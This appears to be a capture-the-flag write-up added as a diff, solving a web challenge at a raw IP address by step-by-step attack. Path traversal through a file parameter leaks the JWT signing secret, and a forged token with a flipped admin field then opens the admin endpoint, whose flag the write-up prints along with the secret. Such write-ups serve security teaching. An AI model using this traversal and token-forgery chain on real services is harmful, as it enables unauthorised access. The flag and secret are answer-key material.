@@ -1,0 +1,40 @@
+1. http://3.142.122.1:9334/ only contains three useful links: /admin(JSON query), /adminNames to obtain getFile with admin names), and /Login to obtain POST JSON query result.
+
+2. I was able to obtain the 'secret code' via 3.142.122.1:9334/getFile?file=../.env:
+G00D_s0ld13rs_k33p_s3cret5
+
+
+3. POST http://3.142.122.1:9334/login and query:
+
+{
+    "username" : "din_djarin11",
+    "password" : ""
+}
+
+
+You will recieve the token: 
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InF2YV9xd25ldmExMSIsInBhc3N3b3JkIjoiIiwiYWRtaW4iOiJzbnlmciIsImlhdCI6MTYyMjkzMjU0OX0.aV4EFeZJdwNNy4nhT5utCyrkQ4n8RIGppG1KTEuqZmw
+
+4. Go to https://jwt.io/ to decode your token and you will see the following result: 
+Header:
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+{
+  "username": "qva_qwneva11",
+  "password": "",
+  "admin": "snyfr",
+  "iat": 1622932549
+}
+
+5. Convert "admin": "snyfr" to "admin": "gehr" (ROT13 conversion) and put "G00D_s0ld13rs_k33p_s3cret5" under verify signature box.
+
+6. GET http://3.142.122.1:9334/admin and add authorization tab under Header section, and send it.
+
+You will see the output:
+Hey din_djarin11! Here's your flag: FURYY{G0x3af_q0_z4gg3e_4r91ns4506s384q460s0s0p6r9r5sr4n}
+
+7. Convert the flag with ROT13 and you will recieve:
+SHELL{T0k3ns_d0_m4tt3r_4e91af4506f384d460f0f0c6e9e5fe4a}
